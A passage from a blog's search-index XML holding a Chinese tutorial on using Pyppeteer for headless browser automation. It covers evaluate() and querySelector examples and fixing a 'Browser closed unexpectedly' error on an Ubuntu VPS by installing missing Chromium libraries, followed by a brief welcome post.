class="keyword">await</span> launch(headless=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="Element-selector-方法名-→-querySelector"><a href="#Element-selector-方法名-→-querySelector" class="headerlink" title="Element selector 方法名 ($→ querySelector)"></a><strong>Element selector 方法名 ($→ querySelector)</strong></h3><p>在python中$是不能作为方法名的。Pyppeteer使用<code>Page.querySelector()</code>&#x2F;<code>Page.querySelectorAll()</code>&#x2F;<code>Page.xpath()</code>代替<br><code>Page.$()</code>&#x2F;<code>Page.$$()</code>&#x2F;<code>Page.$x()</code> Pyppeteer也支持这些方法的缩写<code>Page.J()</code>&#x2F;<code>Page.JJ()</code> &#x2F;<code>Page.Jx()</code></p><h3 id="Page-evaluate-andPage-querySelectorEval-的参数"><a href="#Page-evaluate-andPage-querySelectorEval-的参数" class="headerlink" title="Page.evaluate()andPage.querySelectorEval() 的参数"></a><strong><code>Page.evaluate()</code>and<code>Page.querySelectorEval()</code> 的参数</strong></h3><p>Puppeteer 的 evaluate() 采用 JavaScript 原始函数或 JavaScript 表达式字符串，但 pyppeteer 采用 JavaScript 字符串。<br>JavaScript 字符串可以是函数或表达式。 Pyppeteer 尝试自动检测字符串是函数还是表达式，但有时会失败。 如果表达式字符串被视为函数并引发错误，则添加<br>force_expr&#x3D;True 选项，强制 pyppeteer 将字符串视为表达式。</p><p>Ex1: 获取网页内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content = <span class="keyword">await</span> page.evaluate(<span class="string">&#x27;document.body.textContent&#x27;</span>, force_expr=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>Ex2: 获取元素文本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">element = <span class="keyword">await</span> page.querySelector(<span class="string">&#x27;h1&#x27;</span>)</span><br><span class="line">title = <span class="keyword">await</span> page.evaluate(<span class="string">&#x27;(element) =&gt; element.textContent&#x27;</span>, element)</span><br></pre></td></tr></table></figure><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><h3 id="在-ubuntu-vps运行报错"><a href="#在-ubuntu-vps运行报错" class="headerlink" title="在 ubuntu vps运行报错"></a>在 ubuntu vps运行报错</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;qcc_pyppeteer.py&quot;</span>, line <span class="number">165</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    run_browser(width, height)</span><br><span class="line">  File <span class="string">&quot;qcc_pyppeteer.py&quot;</span>, line <span class="number">159</span>, <span class="keyword">in</span> run_browser</span><br><span class="line">    <span class="keyword">return</span> asyncio.get_event_loop().run_until_complete(main(width, height))</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.8/asyncio/base_events.py&quot;</span>, line <span class="number">616</span>, <span class="keyword">in</span> run_until_complete</span><br><span class="line">    <span class="keyword">return</span> future.result()</span><br><span class="line">  File <span class="string">&quot;qcc_pyppeteer.py&quot;</span>, line <span class="number">62</span>, <span class="keyword">in</span> main</span><br><span class="line">    browser = <span class="keyword">await</span> launch(&#123;<span class="string">&#x27;headless&#x27;</span>: <span class="literal">True</span>,<span class="comment"># 可以无头</span></span><br><span class="line">  File <span class="string">&quot;/home/ubuntu/.local/lib/python3.8/site-packages/pyppeteer/launcher.py&quot;</span>, line <span class="number">307</span>, <span class="keyword">in</span> launch</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> Launcher(options, **kwargs).launch()</span><br><span class="line">  File <span class="string">&quot;/home/ubuntu/.local/lib/python3.8/site-packages/pyppeteer/launcher.py&quot;</span>, line <span class="number">168</span>, <span class="keyword">in</span> launch</span><br><span class="line">    <span class="variable language_">self</span>.browserWSEndpoint = get_ws_endpoint(<span class="variable language_">self</span>.url)</span><br><span class="line">  File <span class="string">&quot;/home/ubuntu/.local/lib/python3.8/site-packages/pyppeteer/launcher.py&quot;</span>, line <span class="number">227</span>, <span class="keyword">in</span> get_ws_endpoint</span><br><span class="line">    <span class="keyword">raise</span> BrowserError(<span class="string">&#x27;Browser closed unexpectedly:\n&#x27;</span>)</span><br><span class="line">pyppeteer.errors.BrowserError: Browser closed unexpectedly:</span><br></pre></td></tr></table></figure><p>首先有可能是环境缺少依赖，通过<code>ldd chrome | grep not</code> 在linux机器上查看缺少的依赖。</p><p>Debian</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">ca-certificates</span><br><span class="line">fonts-liberation</span><br><span class="line">libappindicator3-<span class="number">1</span></span><br><span class="line">libasound2</span><br><span class="line">libatk-bridge2<span class="number">.0</span>-<span class="number">0</span></span><br><span class="line">libatk1<span class="number">.0</span>-<span class="number">0</span></span><br><span class="line">libc6</span><br><span class="line">libcairo2</span><br><span class="line">libcups2</span><br><span class="line">libdbus-<span class="number">1</span>-<span class="number">3</span></span><br><span class="line">libexpat1</span><br><span class="line">libfontconfig1</span><br><span class="line">libgbm1</span><br><span class="line">libgcc1</span><br><span class="line">libglib2<span class="number">.0</span>-<span class="number">0</span></span><br><span class="line">libgtk-<span class="number">3</span>-<span class="number">0</span></span><br><span class="line">libnspr4</span><br><span class="line">libnss3</span><br><span class="line">libpango-<span class="number">1.0</span>-<span class="number">0</span></span><br><span class="line">libpangocairo-<span class="number">1.0</span>-<span class="number">0</span></span><br><span class="line">libstdc++<span class="number">6</span></span><br><span class="line">libx11-<span class="number">6</span></span><br><span class="line">libx11-xcb1</span><br><span class="line">libxcb1</span><br><span class="line">libxcomposite1</span><br><span class="line">libxcursor1</span><br><span class="line">libxdamage1</span><br><span class="line">libxext6</span><br><span class="line">libxfixes3</span><br><span class="line">libxi6</span><br><span class="line">libxrandr2</span><br><span class="line">libxrender1</span><br><span class="line">libxss1</span><br><span class="line">libxtst6</span><br><span class="line">lsb-release</span><br><span class="line">wget</span><br><span class="line">xdg-utils</span><br></pre></td></tr></table></figure><p>VPS上执行的结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-<span class="number">12</span>-<span class="number">12</span>-ubuntu:~/qcc_headless_restful$ ldd /home/ubuntu/.local/share/pyppeteer/local-chromium/<span class="number">588429</span>/chrome-linux/chrome | grep <span class="keyword">not</span> | awk &#123;<span class="string">&quot;print $1&quot;</span>&#125;</span><br><span class="line">libXss.so<span class="number">.1</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libpangocairo-<span class="number">1.0</span>.so<span class="number">.0</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libgtk-<span class="number">3.</span>so<span class="number">.0</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libgdk-<span class="number">3.</span>so<span class="number">.0</span> =&gt; <span class="keyword">not</span> found</span><br><span class="line">libgdk_pixbuf-<span class="number">2.0</span>.so<span class="number">.0</span> =&gt; <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome to intbjw’s blog</title>
      <link href="/2020/02/25/Welcome%20to%20intbjw%E2%80%99s%20blog/"/>
      <url>/2020/02/25/Welcome%20to%20intbjw%E2%80%99s%20blog/</url>
      
        <content type="html"><![CDATA[<h1 id="Welcome-to-intbjw’s-blog"><a href="#Welcome-to-intbjw’s-blog" class="headerlink" title="Welcome to intbjw’s blog"></a>Welcome to intbjw’s blog</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Announcement </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
